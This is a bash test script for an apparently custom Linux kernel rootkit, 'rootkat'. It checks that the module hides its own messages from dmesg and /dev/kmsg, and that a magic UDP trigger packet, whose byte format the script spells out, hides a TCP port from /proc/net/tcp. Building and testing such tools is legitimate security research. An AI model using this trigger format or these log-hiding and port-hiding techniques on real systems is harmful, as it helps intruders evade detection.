#!/usr/bin/env bash
# Asserts: rootkat's own pr_info lines emitted AFTER the vprintk_emit
# filter is armed are dropped before reaching the kernel ring buffer,
# while non-rootkat messages pass through unmolested.
#
# A handful of bootstrap lines structurally leak (kernel's OOT-taint
# warning, our first "loading" pr_info, and the lines we emit *while*
# arming the filter — kallsyms resolver + ftrace install). Those are
# documented in docs/threat-model.md. The test bounds them so a
# regression that suddenly leaks 50+ lines fails loudly.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

CONTROL_MSG="kat-test-marker-not-from-the-module-$$"
HIDE_PORT=12361

dmesg -c >/dev/null 2>&1 || true
assert_zero "module loads" insmod lkm/rootkat.ko

sleep 0.2

# Bootstrap leakage bound. Anything more than ~8 lines means a
# regression (the filter stopped firing for non-bootstrap calls).
N=$(dmesg | grep -c rootkat || true)
echo "post-load rootkat lines in dmesg: $N (bootstrap leakage)"
if [ "$N" -le 8 ]; then
	echo "PASS: bootstrap leakage within bounds"
	ROOTKAT_PASS=$((ROOTKAT_PASS+1))
else
	echo "FAIL: $N rootkat lines visible (>8 indicates filter regression)"
	dmesg | grep rootkat | head -20
	ROOTKAT_FAIL=$((ROOTKAT_FAIL+1))
fi

# The real test: trigger a known post-load rootkat pr_info and verify
# it's dropped. The netfilter handler logs "rootkat/hook_netfilter:
# net hide port <port>" when a magic UDP frame arrives.
exec 3< <(tests/qemu/net_helper $HIDE_PORT)
read -r LINE <&3
NET_PID=$!
sleep 0.2

python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b'rootkat\x00' + bytes([2]) + b'\x00\x00\x00' + struct.pack('!I', $HIDE_PORT)
s.sendto(payload, ('127.0.0.1', 65000))
s.close()
"
sleep 0.2

# Side-effect check: port is now hidden (proves the handler ran).
assert_nonzero "netfilter handler ran (port hidden)" \
	bash -c "awk 'NR>1{split(\$2,a,\":\"); printf \"%d\\n\", strtonum(\"0x\" a[2])}' /proc/net/tcp | grep -qx $HIDE_PORT"

# Filter check: the handler's pr_info is NOT in dmesg.
assert_nonzero "post-load rootkat pr_info filtered" \
	bash -c "dmesg | grep -q 'net hide port $HIDE_PORT'"

kill $NET_PID 2>/dev/null || true
wait $NET_PID 2>/dev/null || true
exec 3<&-

# Selectivity: a control message with NO "rootkat" substring passes
# through cleanly.
echo "$CONTROL_MSG" > /dev/kmsg
sleep 0.1
assert_zero "non-rootkat marker passes through" \
	bash -c "dmesg | grep -q '$CONTROL_MSG'"

# Inverse selectivity: a userspace message that DOES contain "rootkat"
# is filtered (proves the filter operates on /dev/kmsg path too, not
# just kernel-internal printk).
echo "userspace-rootkat-attempt-$$" > /dev/kmsg
sleep 0.1
assert_nonzero "userspace 'rootkat' message dropped via /dev/kmsg" \
	bash -c "dmesg | grep -q 'userspace-rootkat-attempt-$$'"

assert_zero "module unloads" rmmod rootkat
sleep 0.2

# After unload the filter is gone; rootkat-marker messages flow again.
POSTMSG="post-unload-rootkat-marker-$$"
echo "$POSTMSG" > /dev/kmsg
sleep 0.1
assert_zero "post-unload: rootkat marker visible again" \
	bash -c "dmesg | grep -q '$POSTMSG'"

report
